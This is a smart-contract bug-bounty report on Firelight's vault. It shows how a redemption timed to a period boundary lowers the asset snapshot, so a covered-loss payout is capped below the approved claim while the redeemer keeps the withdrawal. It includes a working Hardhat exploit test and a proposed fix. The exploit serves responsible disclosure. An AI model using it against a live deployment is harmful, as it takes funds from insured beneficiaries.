# 89224 sc high inclusive boundary redemption lets a shareholder retain collateral and underpay a covered claim

**Submitted on Aug 17th 2026 at 22:13:17 UTC by @Paludo0x for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89224
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Firelight can pay less than an approved covered loss when a shareholder redeems shares at the start of a period. The redemption lowers the recorded balance of active assets. The redeemed assets remain available for claims because they sit in a pending withdrawal balance. Payout uses the lower recorded balance to set its limit. If the covered loss event closes after that payment, the beneficiary cannot collect the remaining amount through the normal process, while the shareholder can later claim the pending withdrawal.

## Vulnerability Details

Firelight calls a covered loss event an incident. The `IncidentManager` contract processes the incident, including its assessment and closure. Firelight needs the amount of collateral exposed when the incident period begins. It keeps active assets in timestamp checkpoints. It keeps assets waiting for withdrawal in a separate balance. A redemption at the exact period boundary reduces the active assets balance. The withdrawal balance still treats those redeemed assets as collateral for claims from that period. The error is that `payout()` reads the reduced balance as the balance at the start of the period.

### How the incorrect balance is used

{% stepper %}
{% step %}

## `FirelightVault::redeem()` starts the withdrawal before it records the new vault balances

```solidity
// contracts/core/FirelightVault.sol:717-742
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);
_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

`FirelightVault::_requestWithdraw()` adds the assets to `withdrawAssets[currentPeriod() + 1]`. The same redemption reduces `_totalAssets` and keeps the redeemed assets in a pending withdrawal balance. That balance remains part of the collateral used for claims from the current period.
{% endstep %}

{% step %}

## `FirelightVault::_logTrace()` writes the reduced active total under `block.timestamp`

```solidity
// contracts/core/FirelightVault.sol:1044-1055
uint48 ts = Time.timestamp();
_traceTotalSupply.push(ts, _totalSupply);
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

The trace has no separate value for the balance before and after a redemption at the same timestamp. The attack requires the redemption transaction to enter a block at the exact start of the next period. The recorded value at that time then contains the smaller balance after redemption.
{% endstep %}

{% step %}

## `FirelightVault::totalAssetsAt()` uses an inclusive lookup

```solidity
// contracts/core/FirelightVault.sol:456-457
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

`upperLookupRecent()` returns the newest checkpoint with a timestamp lower than or equal to the requested time. Therefore, `totalAssetsAt(periodStart)` can select the checkpoint written by the boundary redemption. The payout should use the balance that existed before that redemption.
{% endstep %}

{% step %}

## `FirelightVault::payout()` includes delayed withdrawals in payable collateral but caps the result with the active assets snapshot

```solidity
// contracts/core/FirelightVault.sol:911-935
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

`activePayableAmount` includes assets from the withdrawal balances. However, the final line also limits payment by `assetsAtCapturePeriod`. After a boundary redemption, this value can be lower than the collateral still exposed to the claim. The payout then uses the reduced active assets balance as its cap, even though the withdrawal balance still includes the same assets as claim collateral.
{% endstep %}

{% step %}

## `IncidentManager::approveCurrentAssessment()` processes the final assessment and closes the incident

```solidity
// contracts/core/IncidentManager.sol:425-438
uint256 vaultPaidAmount = _executePayout(
    $,
    incidentId,
    assessmentRoundId,
    incident.period,
    incident.captureTimestamp,
    totalAssessmentLoss
);
if (vaultPaidAmount > 0) incident.vaultPaidAmount = vaultPaidAmount;
incident.status = IncidentStatus.CLOSED;
```

The `IncidentManager` contract stores any nonzero amount returned by the vault and closes the incident. It does not require the vault payment to equal `totalAssessmentLoss`. The normal incident process does not provide another payment after closure. The shareholder can later claim the pending withdrawal.
{% endstep %}
{% endstepper %}

### Attack path

{% stepper %}
{% step %}

## A shareholder holds a material position in vault shares.

{% endstep %}

{% step %}

## A curator creates a valid cover order for the next period.

{% endstep %}

{% step %}

## The shareholder calls `FirelightVault::redeem()` in a block at the exact start of that period

The call reduces the active assets balance and creates a pending withdrawal balance.
{% endstep %}

{% step %}

## The allocator commits a valid allocation

Its approved loss is greater than the reduced active assets balance but remains within the configured cover limit.
{% endstep %}

{% step %}

## The protocol roles call `IncidentManager::createIncident()`, `addAssessmentLosses()`, and `approveCurrentAssessment()` through the normal process.

{% endstep %}

{% step %}

## `FirelightVault::payout()` limits payment by the reduced checkpoint

`IncidentManager::approveCurrentAssessment()` then closes the incident.
{% endstep %}

{% step %}

## When the withdrawal matures, the shareholder calls `FirelightVault::claimWithdraw()` for the pending withdrawal.

{% endstep %}
{% endstepper %}

## Impact Details

* Funds at risk: the part of an approved claim above the period start active assets checkpoint, when delayed withdrawals still expose more collateral to the same claim.
* Who loses: the covered payout beneficiary loses the unpaid claim amount; the shareholder retains collateral that should have funded that claim.
* Repeatability: the condition can recur at each period boundary for a shareholder with a valid withdrawal request and an affected cover period.
* Autonomous worsening: the incident remains underpaid after closure, and later withdrawal claims preserve the collateral that the closed incident failed to consume.
* No automatic recovery: pausing future vault actions does not repair the checkpoint or reopen the closed incident. Recovery requires a code upgrade, migration, or external compensation.
* Severity: Critical. The bug causes direct loss of funds to a covered beneficiary and lets a shareholder retain vault collateral that should pay the claim. The exact boundary time reduces execution probability, but it does not remove the direct asset impact.

## Recommended Fix

Read the checkpoint immediately before the period start. Another option is to store an immutable exposure value before any new redemption. The lookup must exclude checkpoints written at `capturePeriodStart` by a redemption in that same block:

```solidity
uint256 assetsAtCapturePeriod = _traceTotalAssets.upperLookupRecentBefore(capturePeriodStart);
```

## Proof of Concept

## PoC Explanation

* `deployBoundaryCheckpointIncident()` starts from the developers' `deployVault()` fixture in `test/setup/fixtures.js`. This fixture deploys the real `FirelightVault` proxy, the FAsset test token, and the vault roles.
* The helper then deploys and connects the real `CoverNFT`, `CoverOrderAllocator`, and `IncidentManager` contracts. It does not use the mock vault or mock allocator from the separate component fixtures.
* The test creates a valid cover order, redeems at the exact period boundary, commits and settles the allocation, and processes the covered loss through the normal incident flow.
* It checks that an approved loss of 200,000 pays only 100,000, the incident closes, and the shareholder later claims the remaining withdrawal.
* Run it with `npx hardhat test test/FirelightVault/boundaryCheckpointIncident.poc.js`.

Actual Hardhat output:

```
  Inclusive period boundary checkpoint payout
    ✔ underpays an honest incident while preserving the boundary redeemer withdrawal (1319ms)

  1 passing (1s)
```

```javascript
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");

const { deployVault } = require("../setup/fixtures.js");

const BPS = 10_000n;
const YEAR = 365n * 24n * 3600n;
const ASSET_DECIMALS = 6n;
const CANONICAL_DECIMALS = 18n;
const SCALE_TO_CANONICAL = 10n ** (CANONICAL_DECIMALS - ASSET_DECIMALS);
const ONE_ASSET = 10n ** ASSET_DECIMALS;

const proratedPremium = (coverAmount, annualRateBps, periodDuration) => {
  const numerator = coverAmount * BigInt(annualRateBps) * BigInt(periodDuration);
  const denominator = BPS * YEAR;
  return (numerator + denominator - 1n) / denominator;
};

const premiumToNative = (canonicalAmount) => {
  const scale = SCALE_TO_CANONICAL;
  return (canonicalAmount + scale - 1n) / scale;
};

const marketIdFor = (chainId, protocol, market) =>
  ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(["uint64", "string", "bytes32"], [chainId, protocol, market]),
  );

async function deployBoundaryCheckpointIncident() {
  const vaultCtx = await deployVault({
    decimals: Number(ASSET_DECIMALS),
    initial_deposit_limit: 2_000_000n * ONE_ASSET,
    period_configuration_duration: 604800,
  });

  const [
    deployer,
    allocatorAdmin,
    allocatorCurator,
    allocatorRole,
    allocatorConfigAdmin,
    coverAdmin,
    incidentAdmin,
    incidentCurator,
    assessmentApprover,
    assessmentRejecter,
    incidentInvalidator,
    payoutAdmin,
    priceFeedAdmin,
    payoutReceiver,
    premiumCollector,
    firstLossBuffer,
  ] = await ethers.getSigners();

  const { firelight_vault: vault, token_contract: asset, users, utils } = vaultCtx;
  const attacker = users[0];
  const coveredBuyer = users[1];

  const MockPriceFeed = await ethers.getContractFactory("MockPriceFeed");
  const priceFeed = await MockPriceFeed.connect(deployer).deploy(8, 10n ** 8n);

  const CoverNFTFactory = await ethers.getContractFactory("CoverNFT");
  const coverNFT = await upgrades.deployProxy(
    CoverNFTFactory,
    ["Firelight Cover", "FLCOVER", "", coverAdmin.address, deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: "transparent" },
  );

  const market = ethers.encodeBytes32String("market-A");
  const marketId = marketIdFor(1, "Morpho", market);

  const CoverOrderAllocatorFactory = await ethers.getContractFactory("CoverOrderAllocator");
  const allocator = await upgrades.deployProxy(
    CoverOrderAllocatorFactory,
    [
      {
        vault: vault.target,
        premiumCollector: premiumCollector.address,
        coverNFT: coverNFT.target,
        priceFeedAdapter: priceFeed.target,
        maxPriceAge: 3600,
        premiumTokens: [asset.target],
        admin: allocatorAdmin.address,
        adminRole: allocatorAdmin.address,
        curatorRole: allocatorCurator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: allocatorConfigAdmin.address,
        initialProtocolConcentrations: [{ chainId: 1, protocol: "Morpho", maxProtocolConcentrationBps: 10_000 }],
        newMarkets: [{ chainId: 1, protocol: "Morpho", market }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: asset.target,
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 24_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0,
        },
      },
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await coverNFT.connect(coverAdmin).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

  const IncidentManagerFactory = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManagerFactory,
    [
      incidentAdmin.address,
      incidentCurator.address,
      assessmentApprover.address,
      assessmentRejecter.address,
      incidentInvalidator.address,
      incidentAdmin.address,
      payoutAdmin.address,
      priceFeedAdmin.address,
      payoutReceiver.address,
      allocator.target,
      priceFeed.target,
      3600,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), incidentManager.target);
  await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), incidentManager.target);
  await vault.connect(vaultCtx.payout_allowlister).addToPayoutAllowlist(payoutReceiver.address);

  return {
    ...vaultCtx,
    vault,
    asset,
    coverNFT,
    attacker,
    coveredBuyer,
    allocator,
    allocatorCurator,
    allocatorRole,
    incidentManager,
    incidentCurator,
    assessmentApprover,
    payoutReceiver,
    priceFeed,
    marketId,
    periodDuration: 604800n,
  };
}

describe("Inclusive period boundary checkpoint payout", function () {
  it("underpays an honest incident while preserving the boundary redeemer withdrawal", async function () {
    const ctx = await loadFixture(deployBoundaryCheckpointIncident);
    const {
      vault,
      asset,
      attacker,
      coveredBuyer,
      allocator,
      allocatorCurator,
      allocatorRole,
      incidentManager,
      incidentCurator,
      assessmentApprover,
      payoutReceiver,
      priceFeed,
      utils,
      marketId,
      periodDuration,
    } = ctx;

    const depositAmount = 1_000_000n * ONE_ASSET;
    const depositAmountCanonical = depositAmount * SCALE_TO_CANONICAL;
    // The 2x leverage configured in the production allocator makes this cover
    // valid even after the poisoned snapshot reduces apparent capacity to 200k.
    // This avoids relying on allocator/redeemer ordering in the boundary block.
    const coverAmount = 200_000n * ONE_ASSET * SCALE_TO_CANONICAL;
    const annualRateBps = 500;

    const initialPeriod = await vault.currentPeriod();
    const capturePeriod = initialPeriod + 1n;
    const boundary = await vault.currentPeriodEnd();

    await utils.mintAndApprove(depositAmount, attacker);
    await vault.connect(attacker).deposit(depositAmount, attacker.address);

    const userShares = await vault.balanceOf(attacker.address);
    const redeemShares = (userShares * 9n) / 10n;
    const premiumCanonical = proratedPremium(coverAmount, annualRateBps, periodDuration);
    const premiumNative = premiumToNative(premiumCanonical);

    await asset.mintTo(coveredBuyer.address, premiumNative);
    await asset.connect(coveredBuyer).approve(allocator.target, premiumNative);

    await allocator
      .connect(allocatorCurator)
      .createCoverOrder(
        coveredBuyer.address,
        payoutReceiver.address,
        "covered-victim",
        asset.target,
        [{ marketId, coverRateAnnual: annualRateBps, coverAmount }],
        0,
      );

    const coverOrder = await allocator.getCoverOrder(0);
    expect(coverOrder.period).to.equal(capturePeriod);

    const tree = StandardMerkleTree.of([[0n, [[marketId, coverAmount]]]], ["uint256", "(bytes32,uint256)[]"]);

    // Only the unprivileged redemption needs the exact boundary timestamp.
    const provider = ethers.provider;
    await provider.send("evm_setNextBlockTimestamp", [boundary.toString()]);
    await vault.connect(attacker).redeem(redeemShares, attacker.address, attacker.address);

    const minedBlock = await provider.getBlock("latest");
    expect(BigInt(minedBlock.timestamp)).to.equal(boundary);
    expect(await vault.currentPeriod()).to.equal(capturePeriod);

    const activeAfterBoundary = await vault.totalAssets();
    const withdrawalPeriod = capturePeriod + 1n;
    const boundarySnapshot = await vault.totalAssetsAt(boundary);
    const withdrawalAssetsBeforePayout = await vault.withdrawAssets(withdrawalPeriod);
    const expectedActiveAfterBoundary = 100_000n * ONE_ASSET;
    const expectedWithdrawalBeforePayout = 900_000n * ONE_ASSET;

    expect(boundarySnapshot).to.equal(activeAfterBoundary);
    expect(boundarySnapshot).to.equal(expectedActiveAfterBoundary);
    expect(withdrawalAssetsBeforePayout).to.equal(expectedWithdrawalBeforePayout);

    // Honest allocation happens later and recomputes capacity from the already
    // poisoned snapshot. At 2x leverage, 100k still authorizes 200k of cover.
    const allocationBlock = await provider.getBlock("latest");
    await priceFeed.setLatestRoundData(2, 10n ** 8n, allocationBlock.timestamp, allocationBlock.timestamp, 2);
    const matchingCapacity = coverAmount;
    await allocator.connect(allocatorRole).commitAllocation(capturePeriod, tree.root, coverAmount, matchingCapacity);

    await allocator
      .connect(allocatorRole)
      .settleCoverOrder(0, [{ marketId, allocatedCover: coverAmount }], tree.getProof(0));
    expect(await ctx.coverNFT.ownerOf(0)).to.equal(coveredBuyer.address);

    // The roles below are honest protocol operations. The curator registers the
    // event only after the attacker has created the boundary checkpoint.
    const captureTimestamp = boundary;
    await incidentManager
      .connect(incidentCurator)
      .createIncident(captureTimestamp, "Honest covered incident", ethers.id("boundary checkpoint incident"));
    await incidentManager.connect(incidentCurator).confirmIncident(1, "ipfs://honest-assessment");
    await incidentManager
      .connect(incidentCurator)
      .addAssessmentLosses(1, [{ coverTokenId: 0, marketId, amount: coverAmount }]);
    await incidentManager.connect(incidentCurator).submitCurrentAssessment(1);

    const payoutReceiverBefore = await asset.balanceOf(payoutReceiver.address);
    await incidentManager.connect(assessmentApprover).approveCurrentAssessment(1);
    const payoutReceiverAfter = await asset.balanceOf(payoutReceiver.address);
    const paidAmount = payoutReceiverAfter - payoutReceiverBefore;

    const [incident] = await incidentManager.getIncident(1);
    const withdrawalAssetsAfterPayout = await vault.withdrawAssets(withdrawalPeriod);
    const activeAssetsAfterPayout = await vault.totalAssets();
    const expectedWithdrawalAfterPayout = 810_000n * ONE_ASSET;
    const expectedActiveAfterPayout = 90_000n * ONE_ASSET;
    const requestedVaultPayout = coverAmount / SCALE_TO_CANONICAL;

    expect(incident.status).to.equal(4); // CLOSED
    expect(paidAmount).to.equal(boundarySnapshot);
    expect(paidAmount).to.equal(expectedActiveAfterBoundary);
    expect(incident.vaultPaidAmount).to.equal(paidAmount);
    expect(paidAmount * SCALE_TO_CANONICAL).to.be.lt(coverAmount);
    expect(requestedVaultPayout - paidAmount).to.equal(100_000n * ONE_ASSET);
    expect(withdrawalAssetsAfterPayout).to.equal(expectedWithdrawalAfterPayout);
    expect(activeAssetsAfterPayout).to.equal(expectedActiveAfterPayout);

    // The incident is already closed, so the underpayment cannot be retried.
    // After the claim period opens, the boundary redeemer receives the preserved
    // withdrawal remainder.
    await provider.send("evm_setNextBlockTimestamp", [(await vault.currentPeriodEnd()).toString()]);
    await provider.send("evm_mine");
    await provider.send("evm_setNextBlockTimestamp", [(await vault.currentPeriodEnd()).toString()]);
    await provider.send("evm_mine");

    const attackerBeforeClaim = await asset.balanceOf(attacker.address);
    await vault.connect(attacker).claimWithdraw(withdrawalPeriod);
    const attackerClaim = (await asset.balanceOf(attacker.address)) - attackerBeforeClaim;

    expect(attackerClaim).to.equal(withdrawalAssetsAfterPayout);
    expect(attackerClaim).to.equal(expectedWithdrawalAfterPayout);

    // The attacker also still owns every remaining active share. Their 900k
    // retained vault value is 100k higher than after the valid 200k payout.
    expect(await vault.balanceOf(attacker.address)).to.equal(userShares - redeemShares);
    expect(attackerClaim + activeAssetsAfterPayout).to.equal(900_000n * ONE_ASSET);
  });
});
```
